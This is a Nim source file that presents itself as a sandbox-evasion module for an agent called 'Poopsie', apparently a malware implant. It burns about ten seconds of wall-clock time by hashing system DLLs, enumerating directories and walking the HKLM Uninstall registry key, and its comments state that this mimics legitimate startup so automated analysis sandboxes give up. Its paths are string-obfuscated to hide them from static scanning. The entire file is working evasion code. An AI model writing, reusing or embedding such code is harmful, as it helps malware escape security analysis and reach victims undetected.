## Sandbox evasion module for Poopsie agent.
## Burns wall-clock time using file hashing, directory enumeration,
## and registry walks — mimics legitimate application startup.
## No sleep calls used.

import winim/lean
import strenc

const sandboxDelaySeconds* {.intdefine: "sandbox_delay_seconds".}: int = 10

proc qpcNow(): int64 =
  var counter: LARGE_INTEGER
  QueryPerformanceCounter(addr counter)
  return cast[int64](counter)

proc qpcFreq(): int64 =
  var freq: LARGE_INTEGER
  QueryPerformanceFrequency(addr freq)
  return cast[int64](freq)

proc hashFile(path: string): uint64 {.noinline.} =
  ## Read a file and compute a rolling hash of its contents.
  ## Looks like signature verification / integrity checking.
  let pathW = newWideCString(path)
  let handle = CreateFileW(
    pathW, GENERIC_READ, FILE_SHARE_READ, nil,
    OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0
  )
  if handle == INVALID_HANDLE_VALUE:
    return 0

  var hash: uint64 = 5381
  var buf: array[4096, byte]
  var bytesRead: DWORD

  while true:
    if ReadFile(handle, addr buf[0], cast[DWORD](buf.len), addr bytesRead, nil) == 0:
      break
    if bytesRead == 0:
      break
    for i in 0 ..< int(bytesRead):
      hash = hash * 33 + uint64(buf[i])

  discard CloseHandle(handle)
  return hash

proc hashDirectoryDlls(dir: string): uint64 {.noinline.} =
  ## Enumerate and hash DLL files in a directory.
  ## Looks like an application verifying its dependencies.
  var findData: WIN32_FIND_DATAW
  let pattern = obf("\\*.dll")
  let searchPath = dir & pattern
  let pathW = newWideCString(searchPath)
  let findHandle = FindFirstFileW(pathW, addr findData)

  if findHandle == INVALID_HANDLE_VALUE:
    return 0

  var accumulator: uint64 = 0
  var count: uint32 = 0

  while true:
    # Build full path
    let filename = $cast[WideCString](addr findData.cFileName[0])
    let fullPath = dir & "\\" & filename
    accumulator = accumulator + hashFile(fullPath)
    inc count

    # Hash ~20 files per call to keep each call bounded
    if count >= 20:
      break
    if FindNextFileW(findHandle, addr findData) == 0:
      break

  discard FindClose(findHandle)
  return accumulator

proc enumerateRegistry(): uint64 {.noinline.} =
  ## Walk registry keys under HKLM\SOFTWARE — mimics an installer
  ## or config reader enumerating installed software.
  let subkey = obf("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall")
  let subkeyW = newWideCString(subkey)
  var hkey: HKEY

  if RegOpenKeyExW(HKEY_LOCAL_MACHINE, subkeyW, 0, KEY_READ, addr hkey) != 0:
    return 0

  var accumulator: uint64 = 0
  var index: DWORD = 0
  var nameBuf: array[256, WCHAR]

  # Enumerate subkeys (installed programs)
  while true:
    var nameLen: DWORD = 256
    let regStatus = RegEnumKeyExW(
      hkey, index, addr nameBuf[0], addr nameLen,
      nil, nil, nil, nil
    )
    if regStatus != 0:
      break
    for i in 0 ..< int(nameLen):
      accumulator = accumulator * 31 + uint64(nameBuf[i])
    inc index

  # Enumerate values
  index = 0
  while true:
    var nameLen: DWORD = 256
    var dataLen: DWORD = 0
    let regStatus = RegEnumValueW(
      hkey, index, addr nameBuf[0], addr nameLen,
      nil, nil, nil, addr dataLen
    )
    if regStatus != 0:
      break
    accumulator = accumulator + uint64(dataLen)
    inc index

  discard RegCloseKey(hkey)
  return accumulator

proc getScanDirs(): array[6, string] {.noinline.} =
  ## Runtime-decrypted directory paths to avoid plaintext in binary.
  [
    obf("C:\\Windows\\System32"),
    obf("C:\\Windows\\SysWOW64"),
    obf("C:\\Windows\\System32\\drivers"),
    obf("C:\\Windows\\System32\\wbem"),
    obf("C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319"),
    obf("C:\\Program Files\\Common Files"),
  ]

proc getSystemFiles(): array[6, string] {.noinline.} =
  ## Runtime-decrypted system file paths to avoid plaintext in binary.
  [
    obf("C:\\Windows\\System32\\kernel32.dll"),
    obf("C:\\Windows\\System32\\ntdll.dll"),
    obf("C:\\Windows\\System32\\user32.dll"),
    obf("C:\\Windows\\System32\\advapi32.dll"),
    obf("C:\\Windows\\System32\\ws2_32.dll"),
    obf("C:\\Windows\\System32\\crypt32.dll"),
  ]

proc runSandboxEvasion*() =
  ## Burns approximately sandboxDelaySeconds of wall-clock time using
  ## file hashing, directory enumeration, and registry walks.
  ##
  ## All activity mimics legitimate application startup:
  ## - Reading and hashing DLLs looks like signature/integrity verification
  ## - Registry enumeration looks like config or license checking
  ## - Scanning multiple directories looks like dependency discovery
  let freq = qpcFreq()
  if freq <= 0:
    return

  let targetTicks = int64(sandboxDelaySeconds) * freq
  let start = qpcNow()

  let scanDirs = getScanDirs()
  let systemFiles = getSystemFiles()
  var accumulator: uint64 = 0

  # Phase 1: Calibrate with one round of mixed work
  let calStart = qpcNow()
  accumulator = accumulator + hashDirectoryDlls(scanDirs[0])
  accumulator = accumulator + enumerateRegistry()
  let calEnd = qpcNow()

  let ticksPerRound = max(calEnd - calStart, 1)
  let remainingTicks = targetTicks - (calEnd - start)

  if remainingTicks <= 0:
    return

  # Phase 2: Execute work rounds, checking time periodically
  let estimatedRounds = uint32(remainingTicks div ticksPerRound)
  let checkInterval = max(estimatedRounds div 10, 1)
  var roundsDone: uint32 = 0
  var dirIndex: int = 1  # Start from 1 since we already did [0]

  while true:
    # Check elapsed time periodically
    if roundsDone mod checkInterval == 0:
      let elapsed = qpcNow() - start
      if elapsed >= targetTicks:
        break

    # Rotate through activities to look like real startup work
    case roundsDone mod 4
    of 0:
      # Hash DLLs in rotating directories
      let dir = scanDirs[dirIndex mod scanDirs.len]
      accumulator = accumulator + hashDirectoryDlls(dir)
      inc dirIndex
    of 1:
      # Registry enumeration
      accumulator = accumulator + enumerateRegistry()
    of 2:
      # Hash specific well-known system files (integrity check)
      let file = systemFiles[int(roundsDone div 4) mod systemFiles.len]
      accumulator = accumulator + hashFile(file)
    else:
      # Enumerate a different directory's DLLs
      let dir = scanDirs[(dirIndex + 3) mod scanDirs.len]
      accumulator = accumulator + hashDirectoryDlls(dir)
      inc dirIndex

    inc roundsDone

  # Prevent dead code elimination
  if accumulator == 0xDEADBEEF'u64:
    discard accumulator
